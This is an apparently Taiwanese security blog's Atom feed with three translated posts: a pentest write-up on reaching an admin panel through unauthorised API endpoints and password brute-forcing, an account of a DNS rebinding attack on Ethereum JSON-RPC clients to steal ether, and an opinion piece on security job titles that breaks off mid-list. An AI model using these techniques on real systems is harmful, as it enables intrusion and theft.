<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-05-15T11:36:46+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">用偵查來PWN解後端控制台</title><link href="https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel.html" rel="alternate" type="text/html" title="用偵查來PWN解後端控制台" /><published>2018-05-15T00:00:00+08:00</published><updated>2018-05-15T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel.html">&lt;p&gt;偵察是滲透測試中有趣且最重要的部分。良好的使用偵察，可以有效的查找到 API 端口、相關敏感文件或文件夾、鮮嫩多汁的子網域 (編註:原文如此) 等等。在我最近一次的研究中發現了一個由於缺少授權管理甚至敏感文件還設為公開的目標，這使我能夠輕易進入其管理控制台。&lt;/p&gt;

&lt;p&gt;讓我首先從靜態分析 iOS 應用程式開始。在瀏覽&lt;a href=&quot;https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html#//apple_ref/doc/uid/TP40009252-SW1&quot;&gt;Info.plist&lt;/a&gt;時，我們可以看到裡面有一個寫死的 URL。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[nishaanthguna:~/pentest]$ cat Info.plist | grep -i &quot;http&quot;
&amp;lt;!DOCTYPE plist PUBLIC .. &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;string&amp;gt;https://admin.company.com/xyz/api&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;以此為憑依繼續追查這個URL下去，我們得到一個連結到 Swagger UI 的頁面。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gxdQJhr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然後我們粗略的翻一翻&lt;a href=&quot;https://swagger.io/swagger-ui/&quot;&gt;官方文件&lt;/a&gt;，我們可以看到 Swagger UI 是個用於可視化處理和與 API 互動的資源，它會自動根據載明之規範產生交互。以下是在檢查上一個 UI 頁面時找到的 URL。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mfUxtoy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這裡令人奇怪的是，不僅只在於它行動裝置應用程序的 API 呼叫方式，它甚至還有管理員可以用來管理用戶、管理廣播的內容、管理自定義應用程式使用的聊天機器人端口等等。深入研究額外端口的資訊後，我啟動了 Burp 來查看網路流量。起初，我的想法是用 Swagger UI 中的管理端口來替換行動裝置應用程序的端口，用這方法來檢查 Swagger UI 中的管理端口該程式是否有針對這點設置合適的權限管理來區分普通用戶和管理員帳戶。&lt;/p&gt;

&lt;p&gt;從“管理員帳戶”API文檔中，我們可以看到有一個端口使用&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/users/count&lt;/code&gt;打印出管理員用戶數。這看起來很有&lt;strong&gt;前途&lt;/strong&gt;，因為它不需要任何請求主體(Request body)，而且非常簡單。&lt;/p&gt;

&lt;p&gt;以普通用戶身份登入到行動裝置應用程序，我將其中一個 API 呼叫從&lt;code class=&quot;highlighter-rouge&quot;&gt;/xyz /api/users/account/preferences&lt;/code&gt;更換為&lt;code class=&quot;highlighter-rouge&quot;&gt;/xyz/api/admin/users/count&lt;/code&gt;並轉發請求。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dLiDWpv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功了！
這意味著這伺服器沒有任何授權管理。基本上，我們可以向包括&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/chatbot&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;/moderate&lt;/code&gt;的任何 API 端口發出任何請求，因為我們知道請求主體(Request body) 的結構和相關的標頭(Header)。現在讓我們嘗試使用 Swagger UI 的端口進行更多暴力窮舉並擴大這個漏洞利用。&lt;/p&gt;

&lt;p&gt;從 Swagger UI 附件中，我們可以看到有另一個端口藉由向&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/users/{id}&lt;/code&gt;發送請求來查找有關管理員帳戶的訊息。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /xyz/api/admin/users/1 HTTP/1.1
Host: https://admin.company.com
User Agent: MS-RELEASE/1.0.32 (iPhone; iOS 10.1.1; Scale/2.00)
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkdldCB5b3VyIG93biB0b2tlbiEiLCJpYXQiOjE1MTYyMzkwMjJ9.12neWKBPl2q0alhnEiJ_g018_0YHtZMaFzCjsWs0VE

{
  &quot;ID&quot;: 1,
  &quot;Name&quot;: &quot;Admin User&quot;,
  &quot;Username&quot;: &quot;XYZ&quot;,
  &quot;EMail&quot;: &quot;dev@nonexistingdomain.com&quot;,
  &quot;Roles&quot;: [
    {
      &quot;ID&quot;: 1,
      &quot;Name&quot;: &quot;Admin&quot;,
      &quot;Menu&quot;:[
        {
          &quot;Path&quot;: &quot;#/admin&quot;,
          &quot;Icon&quot;: &quot;fa-user&quot;,
          &quot;Order&quot;: &quot;1&quot;,
          &quot;Roles&quot;: &quot;READ,WRITE&quot;,
        }
      ]
    }  
}     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;真的很棒！使用 Burp 的 Intruder 功能，我們可以通過暴力窮舉&lt;code class=&quot;highlighter-rouge&quot;&gt;{id}&lt;/code&gt;參數來取得所有(共8位)管理員的用戶名與電子郵件。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/iluoWSf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在我們已取得管理員帳戶名可以嘗試登入。讓我們使用從&lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials&quot;&gt;Seclists&lt;/a&gt;中獲取通用密碼列表在觸動警報之前運行一個快速暴力破解程式。&lt;/p&gt;

&lt;p&gt;幸運的是，其中一位管理員帳戶的密碼強度較弱，並且該應用程式在登入頁面中沒有任何速率限制。通過取得的管理員權限，我們可以做任何事情，從添加或刪除用戶，修改移動應用程序中顯示的內容，向終端用戶發送通知以及做許多更多很多有趣的事情。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jZQDhGv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;將各個思路組合在一起，以便在 Web應用程式上取得管理員權限實在十分有趣。我還在&lt;a href=&quot;https://secdevops.ai/ios-static-analysis-and-recon-c611eaa6d108&quot;&gt;SecDevOps&lt;/a&gt;上撰寫了關於iOS應用程式靜態分析的&lt;a href=&quot;https://secdevops.ai/ios-static-analysis-and-recon-c611eaa6d108&quot;&gt;入門&lt;/a&gt;。懇請撥冗參閱 ;）&lt;/p&gt;

&lt;p&gt;不要猶豫，歡迎發表並回饋些意見或評論。如果願意的話，你也可以在&lt;a href=&quot;https://twitter.com/67616d654661636&quot;&gt;Twitter&lt;/a&gt;上直接私訊我。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="API" /><category term="Mobile APP" /><summary type="html">偵察是滲透測試中有趣且最重要的部分。良好的使用偵察，可以有效的查找到 API 端口、相關敏感文件或文件夾、鮮嫩多汁的子網域 (編註:原文如此) 等等。在我最近一次的研究中發現了一個由於缺少授權管理甚至敏感文件還設為公開的目標，這使我能夠輕易進入其管理控制台。</summary></entry><entry><title type="html">DNS重綁 偷你以太幣</title><link href="https://security-onigiri.github.io//2018/05/13/dns.html" rel="alternate" type="text/html" title="DNS重綁 偷你以太幣" /><published>2018-05-13T00:00:00+08:00</published><updated>2018-05-13T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/13/dns</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/13/dns.html">&lt;p&gt;●&lt;a href=&quot;https://ret2got.wordpress.com/author/ret2got/&quot;&gt;ret2got&lt;/a&gt; ●未分類 ●2018年1月19日 ●約4分鐘可讀完&lt;/p&gt;

&lt;p&gt;當我們針對如何利用&lt;a href=&quot;https://twitter.com/taviso/&quot;&gt;Tavis Ormandy&lt;/a&gt;發掘的&lt;strong&gt;在本地主機上的未驗證&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務&lt;/strong&gt;開展討論時，我所想到的第一件事就是把這手法套在以太坊的客戶端（Geth，Mist與Parity）。&lt;/p&gt;

&lt;p&gt;大多數以太坊客戶端都在本機上的8545埠上運行&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務，但由於它位於本機上，所以基於&lt;a href=&quot;https://en.wikipedia.org/wiki/Same-origin_policy&quot;&gt;SOP&lt;/a&gt;的緣故，我們無法直接從用戶的瀏覽器訪問它。在電子錢包中的
&lt;a href=&quot;https://github.com/spesmilo/electrum/issues/3374&quot;&gt;這個文章&lt;/a&gt;利用了&lt;a href=&quot;https://en.wikipedia.org/wiki/Cross-origin_resource_sharing&quot;&gt;CORS&lt;/a&gt;標頭來通過本地主機上的JSON-RPC破解並控制用戶的電子錢包。&lt;/p&gt;

&lt;p&gt;這讓Geth的JSON-RPC看起來非常安全，因為它沒有返還任何的&lt;code class=&quot;highlighter-rouge&quot;&gt;CORS&lt;/code&gt;標頭，但是後來&lt;a href=&quot;https://github.com/cpacia&quot;&gt;cpacia&lt;/a&gt;則在&lt;a href=&quot;https://github.com/spesmilo/electrum/issues/3374&quot;&gt;回文&lt;/a&gt;中下了個有關這個以太坊電子錢包的評論，而這正引發了我的新想法。以下是他當時的回文&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;只是禁用&lt;code class=&quot;highlighter-rouge&quot;&gt;CORS&lt;/code&gt;仍然容易受到DNS重新綁定的攻擊。它應該需要被驗證。       〜cpacia&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我曾聽說過DNS重新綁定，但從來沒有試圖深入研究它。由於Geth的JSON-RPC也未經過身份驗證，它也很可能容易受到DNS重新綁定攻擊是嗎？&lt;/p&gt;

&lt;p&gt;還著實作的想法，我後來在&lt;a href=&quot;https://searchsecurity.techtarget.com/definition/DNS-rebinding-attack&quot;&gt;這裡&lt;/a&gt;找到了些&lt;a href=&quot;https://en.wikipedia.org/wiki/DNS_rebinding&quot;&gt;DNS重新綁定&lt;/a&gt;的基本定義。&lt;/p&gt;

&lt;p&gt;我嘗試開始研究DNS的重新綁定，但遇到個主要問題是所有的文章都是上古世紀的遺物。所以我在Bug Bounty的論壇上詢問了這個問題，幸運的，&lt;a href=&quot;https://twitter.com/TheBoredEng&quot;&gt;Luke Young&lt;/a&gt;就將他2017年關於現今可行的DNS重新開發利用之&lt;a href=&quot;https://www.youtube.com/watch?v=Q0JG_eKLcws&quot;&gt;DEFCON神級演講&lt;/a&gt;的連結發來給我。它還包括了一個&lt;a href=&quot;https://github.com/linkedin/jaqen&quot;&gt;自動化工具&lt;/a&gt;，可以在大多數現存瀏覽器上實現DNS重新綁定。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TJQyWCe.png&quot; alt=&quot;&quot; /&gt;
(嘿，起司，我知道你可以，但針對”現存”，請你躺回去。)&lt;/p&gt;

&lt;p&gt;了解愈多讓我愈好奇，但我並不想使用任何預製工具。所以我開始編寫我自己的DNS伺服器。Python有一個非常好的函式庫──&lt;code class=&quot;highlighter-rouge&quot;&gt;dnslib&lt;/code&gt;。它可以為我處理大部分的東西。我還註冊了一個網域，並設置了一些&lt;code class=&quot;highlighter-rouge&quot;&gt;glue records&lt;/code&gt;指向我的伺服器，並將它們用作&lt;code class=&quot;highlighter-rouge&quot;&gt;nameservers&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;因為我想看看不同瀏覽器在遇到極低的TTL中的行為表現，所以我讓我的DNS服務器返還&lt;code class=&quot;highlighter-rouge&quot;&gt;TTLs &amp;lt; 5&lt;/code&gt;。而有趣的是，Chrome、Firefox和Safari都接受了這個等待60秒的DNS回應，儘管他標明TTL小於5。&lt;/p&gt;

&lt;p&gt;60秒並不是很長時間，應該還算在可接受範圍，而我想我可以讓用戶留在我的網頁上至少60秒。現在唯一剩下的就是實際嘗試。&lt;/p&gt;

&lt;p&gt;我用&lt;code class=&quot;highlighter-rouge&quot;&gt;--rpc&lt;/code&gt;旗幟（當然是在testnet上）&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;geth -rpc -testnet&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;現在是時候加點Javascript的料了，而這正是最難的部分。因為我不是一個好的web開發人員，每次使用JavaScript的處理某些行為時，我都很難將自己的思緒兜起來以JS實現。所以我跌跌撞撞的在3個小時內寫出了一個非常糟糕但有效果的JavaScript。而最初的結果是成功的。&lt;/p&gt;

&lt;p&gt;現在為了使它與geth一起成功運行，因為&lt;code class=&quot;highlighter-rouge&quot;&gt;SOP&lt;/code&gt;，我必須在8545埠上運行我的web伺服器和網域。但是，如果我到時要受害者自主將Web連結封包發送給任何埠號為8545的人，但這方法感覺起來實在有點草率且不精緻。&lt;/p&gt;

&lt;p&gt;所以我想到的解決方案是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;。我讓&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;監聽8545和80，並為這兩個埠各設置一個虛擬主機。現在我可以建立&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;將對80的請求轉到8545埠並在其中隱藏的&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;運行所有的JavaScript。&lt;/p&gt;

&lt;p&gt;另一個問題是關於多個用戶，如果多個用戶同時訪問我的網域會怎麼樣？DNS伺服器肯定會因為我這種使用基於計數器的系統而感到困惑，並且因此無法區分各個用戶的請求。這問題讓我整個計畫撞牆了一段時間，直到我記起有&lt;code class=&quot;highlighter-rouge&quot;&gt;subdomains&lt;/code&gt;這個東西。&lt;/p&gt;

&lt;p&gt;每當用戶訪問主域名時，我都可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;為其添加一個隨機子域名用作標識。我知道我可能沒法很好地解釋它，但接下來我舉個例子好了。&lt;/p&gt;

&lt;p&gt;讓我們假設我的網域名稱為&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;而我的伺服器的IP是&lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;這樣，那麼流程是：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;受害者在瀏覽器中打開&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;首先，DNS請求attacker.com被發送到我的伺服器，並回應以真實IP &lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;接下來，&lt;code class=&quot;highlighter-rouge&quot;&gt;attacker.com&lt;/code&gt;加載到用戶的瀏覽器，然後創建一個隱藏的&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;與一個隨機子域&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com:8545&lt;/code&gt;，並將其附加到&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;body&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;現在，DNS請求被發送到我的伺服器的子網域&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com&lt;/code&gt;，並且DNS伺服器再次回應真實IP &lt;code class=&quot;highlighter-rouge&quot;&gt;87.87.87.87&lt;/code&gt;。但是這一次，由於目的位於8545埠上，所以&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;會使用不同的虛擬主機進行回應，進而開始DNS重新綁定攻擊。&lt;/li&gt;
  &lt;li&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrsub.attacker.com:8545&lt;/code&gt;中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Javascript&lt;/code&gt;會等待60秒，然後發送一個&lt;code class=&quot;highlighter-rouge&quot;&gt;XmlHttpRequest&lt;/code&gt;給&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrr.attacker.com:8545/test&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;由於DNS緩存已過期，瀏覽器會再次解析DNS。這一次，我的伺服器會回應IP &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;現在請求實際上被發送給&lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8545/test&lt;/code&gt;而不是我的伺服器，並且由於它來源仍被認知為&lt;code class=&quot;highlighter-rouge&quot;&gt;randomrr.attacker.com:8545&lt;/code&gt;，所以我們仍能夠讀取回應。&lt;/li&gt;
  &lt;li&gt;由於我們每次都會生成一個隨機的子網域，因此我們現在甚至可以容納多個用戶，因為子網域可以執行其身份標識。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;為此，我還不得不優化JavaScript，以確保它在95％的時間內運作正常。我在真實的DNS查詢之前添加了一些虛假的DNS查詢，以便它在錯誤的時間不會用錯誤的IP進行響應。&lt;/p&gt;

&lt;p&gt;這基本上也可以用存儲型XSS來破解利用。只需將Script的src指向目標添加&lt;code class=&quot;highlighter-rouge&quot;&gt;iframe&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;TADA&lt;/code&gt;即可！&lt;/p&gt;

&lt;p&gt;所以現在我們可以閱讀&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務的回應，這意味著我們可以讀取他們的以太幣地址，他們的存款數，並且如果他們的賬戶未鎖，他們可能可以竊取他們的以太幣。&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;的API有一個相當不錯的方法──&lt;code class=&quot;highlighter-rouge&quot;&gt;eth_sendTransaction&lt;/code&gt;，它基本上可以用來從用戶帳戶發送&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;我在&lt;a href=&quot;http://rebinddns.ml/&quot;&gt;http://rebinddns.ml&lt;/a&gt; (注意點擊) 上設置了概念驗證。如果你持續超過60秒，並且使用&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;運行Geth（或任何其他&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;客戶端），您將看到一個&lt;code class=&quot;highlighter-rouge&quot;&gt;alert（）&lt;/code&gt;，其中將包含您的&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;地址及其餘額。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jsroMso.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PoC中使用的所有文件都可以在我的&lt;a href=&quot;https://github.com/drigg3r/Ethereum-JSONRPC-DNS-Rebinding&quot;&gt;Github&lt;/a&gt;上找到。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;min.js - 在8545埠上生成子網域及隱藏iframe的Js文件&lt;/li&gt;
  &lt;li&gt;main.js - 執行DNS重新綁定的Js文件&lt;/li&gt;
  &lt;li&gt;server.py - 用python編寫的DNS伺服器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本篇主要概念是以注入的惡意轉址搭配DNS重綁定來攻擊以太坊的未驗證&lt;code class=&quot;highlighter-rouge&quot;&gt;JSON-RPC&lt;/code&gt;服務，來取得攻擊成果。&lt;/p&gt;

&lt;p&gt;我已經證實Geth以太幣的C++客戶端和python客戶端都很脆弱。PoC已經在Firefox，Chrome和Safari上進行了測試。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;PS：這已經被報告給了&lt;code class=&quot;highlighter-rouge&quot;&gt;ethereum&lt;/code&gt;基金會，但他們並不認為它是一個有效的漏洞。&lt;/p&gt;

&lt;p&gt;有任何問題，你都可以到我的twitter&lt;a href=&quot;https://twitter.com/ret2got&quot;&gt;@ret2got&lt;/a&gt;上私訊我。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Blockchain" /><summary type="html">●ret2got ●未分類 ●2018年1月19日 ●約4分鐘可讀完 當我們針對如何利用Tavis Ormandy發掘的在本地主機上的未驗證JSON-RPC服務開展討論時，我所想到的第一件事就是把這手法套在以太坊的客戶端（Geth，Mist與Parity）。</summary></entry><entry><title type="html">你不算個資安專家，如果你只是…</title><link href="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html" rel="alternate" type="text/html" title="你不算個資安專家，如果你只是..." /><published>2018-05-08T00:00:00+08:00</published><updated>2018-05-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html">&lt;h1 id=&quot;well-you-are-not-a-security-specialist-if-you-&quot;&gt;Well, you are not a “Security Specialist” if you …&lt;/h1&gt;

&lt;p&gt;Starting this thread is easy …&lt;/p&gt;

&lt;p&gt;I spotted many of people nowadays claimed that they are an “InfoSec Specialist” on their resume, Linkedin profile, etc. This will eventually makes life a bit more difficult for the HR personnel or inexperience hiring managers that are genuinely looking for a real-deal InfoSec Specialist to fill certain specifi job roles.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;用講的很簡單 …&lt;/p&gt;

  &lt;p&gt;我發現現在很多人在他們的履歷、Linkedin 專頁等等，宣稱自己是”資安專家”。這只是在為難想找真正的專家來填補工作空缺的那些 HR 或人事經理人們而已。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, here are things that separate them from the real specialists and experts out there. See if you may be considered into one of them (inadvertently or deliberately):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以，這裡是一些可以用來區分他們是否為真正的專家，或是熟捻相關事務的從業人員，或許你會想考慮其中一個職業（不小心或蓄意的）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Pentesting/Ethical Hacking Specialist if your day to day job just utilzing some tools to look for vulnerability such as Qualys, Nessus, OpenVAS, Nikto, Acunetix, and alike. We called these tools: Automated Vulnerability Scanners and using one of them does not makes you a Hacker or Pentester Specialist. To makes you a real Pentester, you need to be able to break into the systems manually and be able to gain root/administrator privileges on that system you are breaking (in which pratically allowed you to do anything you wanted with that compromised system). Alternatively you should be able to demonstrate the capability to ex-filtrate any sensitive information out from its protected repositories even if you only given a standard user privilege access to that system.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個專業&lt;strong&gt;滲透測試/道德駭客&lt;/strong&gt;，如果你每天的工作內容都是，使用類似 Qualys、Nessus、OpenVAS、Nikto、Acunetix 之類的工具尋找弱點。我們稱這些工具為：自動化弱點掃描器，使用其中一個工具並不會讓你變成駭客或是滲透測試專家。想當一個真正的滲透測試者，你需要要能手動侵入一個系統並且獲得該系統的管理員權限（表示在那被攻陷的系統上你可以為所欲為）。或是你應該能展示出從一個被保護的存放處洩漏出敏感資訊的能力，甚至你只有被給予一個該系統上一般的使用者權限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Malware Reverse Engineering Specialist if what you are doing simply googling the executable filenames or its MD5 hashes and look it up at VirusTotal or take that executables and run it into the Automated Malware Sandbox Analyzer such as Cuckoo, VT, Malwr, GFI, etc. to be called a real Malware Revese Engineering Specialist, you should be able to perform surgical of the malicious binary files using Hex Editor, Debugger and Disassembler and MOST IMPORTANTLY to be able to decode, de-obfuscate and probaly decrypt the codes and login behind the binary file and locate in which part of the code’s sub-routine that is/are doing evil as to validate if the binary is truly malicious.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個專業&lt;strong&gt;惡意程式逆向工程師&lt;/strong&gt;，如果你只是簡單的 google 執行檔的名稱或是他的 MD5 雜湊並在 VirusTotal 搜尋它，或是丟到 Cuckoo、VT、Malwr、GFI 等等的自動化惡意程式沙盒分析工具。要想成為一個真正的惡意程式逆向工程專家，你應該要能使用&lt;em&gt;十六進位編輯器&lt;/em&gt;、&lt;em&gt;除錯器&lt;/em&gt;、&lt;em&gt;反組譯器&lt;/em&gt;剖析惡意程式二進位檔案，還有&lt;strong&gt;最重要的是&lt;/strong&gt;可以解碼、解混淆並正確的解密程式碼，並且定位到執行惡意行為的程式區段，如果它是真的惡意程式的話。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Cyber Threat Intelligent Specialist if what you do is just to read and forward InfoSec news to your bosses/IT Team without having a proper method on how to dissect, filter and process that information into a valuable intelligence that are useful for your organization in term of how to provide early detection, prevent and deter the cyber attack or casualties from arising or happening to your ogranization.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;網路威脅情資專家&lt;/strong&gt;，如果你只是純粹讀一讀資安新聞，或是轉發資安新聞給你老闆/IT 團隊。在危害發生前，你需要提供一個適切的方法來處理該資訊成為對你的組織有價值的情資，以達到早先偵測、避免與阻斷網路攻擊的目的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not a Network Attack/DDoS Mitigator Specialist if what you do is merely to have your inbound internet link traffics routed behind a DDoS Scrubbing Provider (like Prolexic/Akamai, Verisign, Incapsula, etc) and you were involved to any DDoS attack events just because you were being called /paged-out by oyur DDoS cloud provider to joined their bridgeline and listening to what they are doing over the phone. To be called a specialist in this field, you need to know how exactly the Network/DDoS attacks coming to your network: the attack vectors, methods, protocols being abused, types of attacks, what is the mitigation control you have in-premise and on-the-cloud, when and what mitigations to activate, etc. You need to be proficient in reading and understand the underlying of packet captures and you also need to know how to build and enhance your defense posture to adapt with the ever increasing attack methods being launch and seen to-date.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;網路攻擊/分散式阻絕緩解專家&lt;/strong&gt;，如果你只是修改路由將網際網路的輸入流量轉接到 DDoS 流量清洗商(例:Prolexic/Akamai, Verisign, Incapsula…)或只從鍵盤參與或是與你的 DDoS 流量清洗商用電話溝通加入他們的實況轉播。
這方面的專業人士必須真正了解網路與 DDoS 攻擊 是如何進入你的網路，例如: 清楚攻擊向量、方式、使用的通訊協定、攻擊類型，地端與雲端可用的緩解方案，緩解方案的啟動時機。
舉例來說，你必須熟悉如何獲取封包並且能夠閱讀內容，同時你必須能夠建立並加強自己的防禦機制去解決與日俱增的攻擊方式和現今正在發生的攻擊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not Security Event Management Specialist if what you do is just to received event alerts from your IDSes or Log alerting/correclation tools (such as Splunk, ArcSight ESM, etc) and escalate this alerts to your security vendor whom job function is simply doing Level-1 of event forwarding blindly to the proper team. In order to makes you a real Security Event Management Specialist, you need to be able to do some basic analysis of the events and to determine which ones are real events and which ones are false positive. You also needs to have capability to filter out and reduced any false positives by tuning the SIEM system you have access to.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不算是一個&lt;strong&gt;資安事件管理專家&lt;/strong&gt;，如果你只是從你的入侵偵測系統(IDS)收警告或日誌告警/關聯工具 (諸如：Splunk、ArcSight ESM 等)並將告警呈報給你的資安供應商，這種初級且簡單到可以矇眼轉送的工作。為了成為一個正港的資安事件管理職人，你需要能實作初步的分析判斷哪些是誤報，哪些是真正的告警。你也需要會調校你的 SIEM 系統以達到過濾及減少誤報。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;You are not Security Intrusion Analyst/Specialist if you are simply doing the above job roles of Security Event Management Specialist. To makes you a real deal Seucrity Intrusion Analyst/Specialist, you need to be able to read inside packet capture and tell us on the spot of what is it raelly happening on any particular events. You also will need to be able to perform a holistic analysis even in the case where full packet capture is not available and you need to rely on other means likes system/proxy/firewall/network logs etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不能算是正港的&lt;strong&gt;資安入侵分析師/專家&lt;/strong&gt;，如果你只是做一些上面提到資安事件管理專家做的事情。要想當個真真正正的資安入侵分析師/專家，你需要有透過封包分析並告訴我們目前到底發生了什麼事情。同時也要在封包收錄不足的情況下，佐以系統/代理伺服器/防火牆/網路日誌等等，做到一個完整的解析說明。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
